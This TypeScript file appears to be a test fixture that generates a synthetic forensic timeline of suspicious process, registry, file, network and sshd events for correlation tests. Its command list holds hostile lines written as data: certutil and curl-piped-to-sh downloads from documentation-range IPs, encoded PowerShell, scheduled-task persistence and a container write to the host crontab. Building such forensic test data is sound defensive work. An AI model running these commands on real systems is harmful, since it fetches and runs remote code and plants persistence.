import type { ForensicEvent } from "../../../src/analysis/stateTypes.js";

// A synthetic, mixed forensic timeline for the yielding-merge tests (#2716): process starts with
// suspicious command lines (certutil, encoded PowerShell, a container shell), Run-key writes, Temp
// script drops, network legs on the same host and minute, year-guessed rows for the clamp, and exact
// duplicates from a second source so correlation folds some rows. No real hosts, names or addresses
// (documentation ranges only).

const CMDS = [
  "powershell.exe -enc SQBFAFgA",
  "certutil -urlcache -split -f http://198.51.100.7/a.exe C:\\Windows\\Temp\\a.exe",
  "cmd /c whoami /all",
  "rundll32.exe C:\\Users\\Public\\x.dll,Start",
  "schtasks /create /tn upd /tr C:\\Windows\\Temp\\u.exe",
  "/bin/bash -c 'curl http://203.0.113.9/s | sh'",
  "docker exec web sh -c 'echo x >> /host/etc/crontab'",
];

function base(n: number, host: string, t: string): ForensicEvent {
  return {
    id: `fx${n}`,
    timestamp: t,
    description: "",
    severity: n % 7 === 0 ? "High" : "Medium",
    mitreTechniques: n % 5 === 0 ? ["T1059.001"] : [],
    relatedFindingIds: [],
    sourceScreenshots: ["fixture.json"],
    asset: host,
  };
}

/** Row `n` of the fixture; deterministic. */
export function fixtureEvent(n: number): ForensicEvent {
  const host = `HOST-${n % 11}`;
  const t = new Date(Date.UTC(2026, 0, 1) + Math.floor(n / 4) * 60_000 + (n % 4) * 1000).toISOString();
  const e = base(n, host, t);
  switch (n % 6) {
    case 0: {
      const cmd = CMDS[n % CMDS.length];
      return {
        ...e,
        description: `Process created on ${host}: ${cmd} (pid ${n})`,
        commandLine: cmd,
      };
    }
    case 1:
      return {
        ...e,
        description: `Registry value set HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Upd${n % 13} on ${host}`,
      };
    case 2:
      return {
        ...e,
        description: `File created C:\\Windows\\Temp\\drop${n % 17}.ps1 on ${host}`,
        path: `c:\\windows\\temp\\drop${n % 17}.ps1`,
      };
    case 3:
      return {
        ...e,
        description: `Outbound connection from ${host} to 198.51.100.7:443`,
        dstIp: "198.51.100.7",
        port: 443,
      };
    case 4:
      // A year-guessed syslog line, mis-dated a year early: the clamp's input.
      return {
        ...e,
        timestamp: t.replace(/^2026/, "2025"),
        yearInferred: true,
        description: `sshd[${n}]: Accepted password for svc from 203.0.113.${n % 200} on ${host}`,
      };
    default:
      // An exact duplicate of the row three back, reported by a second source: correlation folds it.
      return { ...fixtureEvent(n - 3), id: `fx${n}`, sourceScreenshots: ["second-source.json"] };
  }
}

export function fixtureTimeline(count: number): ForensicEvent[] {
  return Array.from({ length: count }, (_, i) => fixtureEvent(i + 1));
}
